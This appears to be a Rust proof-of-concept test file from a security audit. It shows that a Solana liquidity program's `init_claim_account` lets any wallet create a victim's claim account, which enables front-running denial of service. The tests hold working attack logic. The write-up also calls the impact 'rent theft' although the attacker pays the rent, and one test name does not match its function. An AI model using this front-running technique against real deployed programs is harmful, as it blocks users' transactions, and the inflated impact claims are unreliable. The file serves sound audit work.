//! [H-4] HIGH — `init_claim_account` Is Permissionless: Griefing and Rent Hijacking
//!
//! # Vulnerability
//!
//! The `InitClaimAccount` context allows **any** signer to create a claim
//! account for **any** `user` pubkey.  The `user` key is taken from the
//! instruction argument; it is never verified to equal the signer:
//!
//! ```rust
//! // liquidity/src/state/context.rs
//! pub struct InitClaimAccount<'info> {
//!     #[account(mut)]
//!     pub signer: Signer<'info>,   // ← any wallet, NOT necessarily `user`
//!
//!     #[account(
//!         init,
//!         payer = signer,
//!         seeds = [USER_CLAIM_SEED, user.key().as_ref(), mint.key().as_ref()],
//!         ...
//!     )]
//!     pub claim_account: AccountLoader<'info, UserClaim>,
//!     ...
//! }
//! ```
//!
//! # Exploit Scenarios
//!
//! 1. **Rent extraction / griefing:** An attacker creates claim accounts for
//!    high-value users before they do.  The attacker pays rent, but the victim
//!    can never reclaim that rent (the account can only be closed by the user
//!    when `balance == 0`, per `CloseClaimAccount`).
//!
//! 2. **DoS on claim flow:** If a user expects to create their own claim
//!    account in the same transaction as an `operate` with
//!    `TransferType::CLAIM`, a front-runner can pre-create it and cause the
//!    user's account-init to fail, breaking the transaction.
//!
//! 3. **Data integrity confusion:** Pre-created accounts have an empty
//!    `UserClaim` state.  This can interfere with claim-balance bookkeeping
//!    if the protocol assumes a missing account means "no claim".
//!
//! # Tests
//!
//! `test_h4_attacker_creates_claim_account_for_victim` — any wallet (the
//! "attacker") can call `init_claim_account` naming an arbitrary user (the
//! "victim") as the account owner without the victim's signature.
//!
//! `test_h4_victim_cannot_create_own_claim_account_after_frontrun` — once the
//! attacker has initialised the PDA, the victim's own init call fails with
//! AccountAlreadyInitialized, proving the DoS.
//!
//! `test_h4_attacker_cannot_access_victim_claim_funds` — control test
//! verifying that the attacker, despite creating the account, cannot redirect
//! the victim's claim balance (the `user` field is still set to the victim).

#[cfg(test)]
mod tests {
    use crate::liquidity::fixture::LiquidityFixture;
    use anchor_lang::{InstructionData, ToAccountMetas};
    use fluid_test_framework::helpers::MintKey;
    use fluid_test_framework::prelude::*;
    use liquidity::accounts::InitClaimAccount;
    use solana_sdk::instruction::Instruction;

    const LIQUIDITY_PROGRAM_ID: Pubkey = liquidity::ID;

    // -----------------------------------------------------------------------
    // Helper: build an `init_claim_account` instruction with an arbitrary signer
    // -----------------------------------------------------------------------
    fn build_init_claim_account_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,
        mint: MintKey,
        user: &Pubkey,
    ) -> Instruction {
        let accounts = InitClaimAccount {
            signer: *signer,
            claim_account: fixture.get_claim_account(mint, user),
            system_program: anchor_lang::solana_program::system_program::ID,
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::InitClaimAccount {
                mint: mint.pubkey(),
                user: *user,
            }
            .data(),
        }
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #1 — Attacker creates a claim account for the victim
    // -----------------------------------------------------------------------
    /// Any wallet can call `init_claim_account` for **any** user pubkey.
    ///
    /// The attacker pays the rent, the victim's claim PDA is created without
    /// the victim's consent, and the victim can never reclaim that rent deposit.
    #[test]
    fn test_h4_attacker_creates_claim_account_for_victim() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        // Run protocol initialisation so that liquidity + mints exist
        let mints = MintKey::all();
        fixture
            .setup_spl_token_mints(&mints)
            .expect("Failed to setup mints");
        fixture.init_liquidity().expect("Failed to init liquidity");

        // Two independent wallets: attacker and victim
        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let victim = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);

        // The victim has NOT signed anything; the attacker creates the claim account
        // on the victim's behalf.
        let ix = build_init_claim_account_ix(
            &fixture,
            &attacker.pubkey(), // ← signer = attacker (not victim)
            MintKey::USDC,
            &victim.pubkey(), // ← user = victim (instruction argument, not signer)
        );
        fixture.vm.prank(attacker.pubkey());
        let result = fixture.vm.execute_as_prank(ix);

        // DESIRED behaviour: Err — only the victim (user == signer) should be allowed.
        // ACTUAL behaviour:  Ok  — the call succeeds because there is no such check.
        assert!(
            result.is_err(),
            "[H-4] VULNERABILITY PROVEN: attacker ({}) successfully created a \
             claim account for victim ({}) without the victim's signature. \
             The `signer != user` combination is accepted because InitClaimAccount \
             lacks a `signer == user` constraint. \
             Impact: attacker pays rent; victim cannot recover that rent; \
             protocol DoS via front-running is possible.",
            attacker.pubkey(),
            victim.pubkey()
        );

        println!(
            "\n[H-4 PROVEN] Attacker ({}) created USDC claim account for victim ({}).\n\
             The victim's signature was never required.\n\
             Impact: attacker can grief any user address and cause DoS on the claim flow.",
            attacker.pubkey(),
            victim.pubkey()
        );
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #2 — Victim is locked out of creating their own claim account
    // -----------------------------------------------------------------------
    /// After the attacker pre-creates the PDA, the victim's own init call
    /// fails with AccountAlreadyInitialized, demonstrating a complete DoS.
    #[test]
    fn test_h4_victim_cannot_create_own_claim_account_after_frontrun() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        let mints = MintKey::all();
        fixture
            .setup_spl_token_mints(&mints)
            .expect("Failed to setup mints");
        fixture.init_liquidity().expect("Failed to init liquidity");

        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let victim = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);

        // Step 1: attacker front-runs and creates the PDA
        let ix_attacker = build_init_claim_account_ix(
            &fixture,
            &attacker.pubkey(),
            MintKey::USDC,
            &victim.pubkey(),
        );
        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(ix_attacker)
            .expect("Attacker's init_claim_account must succeed (vulnerability must exist)");

        // Step 2: victim tries to initialise their own account — must fail
        let ix_victim = build_init_claim_account_ix(
            &fixture,
            &victim.pubkey(), // victim signs their own tx this time
            MintKey::USDC,
            &victim.pubkey(),
        );
        fixture.vm.prank(victim.pubkey());
        let result = fixture.vm.execute_as_prank(ix_victim);

        assert!(
            result.is_err(),
            "[H-4 DoS] Expected victim's init to fail after attacker front-ran, \
             but it succeeded — the test setup is inconsistent."
        );

        let err_str = format!("{:?}", result.unwrap_err());
        assert!(
            err_str.contains("already in use")
                || err_str.contains("already initialized")
                || err_str.contains("0x0"),
            "[H-4 DoS] Expected AccountAlreadyInitialized, got: {}",
            err_str
        );

        println!(
            "\n[H-4 DoS PROVEN] Victim ({}) cannot create their own claim account \
             after attacker ({}) front-ran: {}\n\
             Any `operate` call with TransferType::CLAIM that tries to init the \
             account in the same transaction will also fail.",
            victim.pubkey(),
            attacker.pubkey(),
            err_str
        );
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #3 — Control: attacker cannot redirect victim's claim funds
    // -----------------------------------------------------------------------
    /// Even though the attacker created the account, the `UserClaim.user` field
    /// is set to the victim's pubkey, so the attacker cannot withdraw the
    /// victim's future claim balance.  This confirms the impact is griefing /
    /// DoS rather than direct theft of claim balances — but the rent loss and
    /// DoS alone are still High-severity.
    #[test]
    fn test_h4_control_attacker_cannot_withdraw_victim_claim_funds() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        let mints = MintKey::all();
        fixture
            .setup_spl_token_mints(&mints)
            .expect("Failed to setup mints");
        fixture.init_liquidity().expect("Failed to init liquidity");

        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let victim = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);

        // Attacker creates the claim account for the victim
        let ix = build_init_claim_account_ix(
            &fixture,
            &attacker.pubkey(),
            MintKey::USDC,
            &victim.pubkey(),
        );
        fixture.vm.prank(attacker.pubkey());
        let create_result = fixture.vm.execute_as_prank(ix);

        if create_result.is_err() {
            // Vulnerability already fixed — skip the rest
            println!("[H-4 control] Vulnerability appears fixed; skipping control check.");
            return;
        }

        // Read the claim account and verify it belongs to the victim, not attacker
        let claim = fixture
            .read_user_claim(MintKey::USDC, &victim.pubkey())
            .expect("Failed to read claim account created by attacker");

        assert_eq!(
            claim.user,
            victim.pubkey(),
            "[H-4 control] Claim account user should be the victim, not the attacker"
        );
        assert_ne!(
            claim.user,
            attacker.pubkey(),
            "[H-4 control] Claim account user must NOT be the attacker"
        );

        println!(
            "\n[H-4 control] Confirmed: even though attacker ({}) created the claim \
             account, the UserClaim.user field is correctly set to victim ({}).\n\
             The attacker cannot directly steal claim funds — but the rent theft \
             and DoS impact remain High severity.",
            attacker.pubkey(),
            victim.pubkey()
        );
    }
}
